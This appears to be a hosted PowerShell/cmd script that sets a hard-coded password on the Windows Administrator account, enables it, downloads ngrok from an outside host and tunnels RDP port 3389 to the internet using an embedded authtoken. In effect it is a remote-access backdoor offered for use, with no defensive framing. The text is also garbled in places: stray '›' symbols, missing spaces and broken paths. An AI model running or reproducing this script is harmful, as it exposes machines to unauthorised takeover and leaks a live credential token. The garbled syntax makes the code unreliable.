Hosted File:
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "@rdpbyav321" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser
Invoke-WebRequesthttps://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip-OutFile ngrok.zip tar xf ngrok.zip
Copy ngrok.exe C: \Windows \System32
cmd /c echo ./ngrok.exe authtoken "2DgQR0pL6zYwGrYgkVz3o24r5mq_4tYJ6k23Gyjmv8ffy8hmS" ›a.ps1
cmd /c echo cd /k start ngrok.exe tcp 3389 ››a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >›a.ps1
• \a. ps1
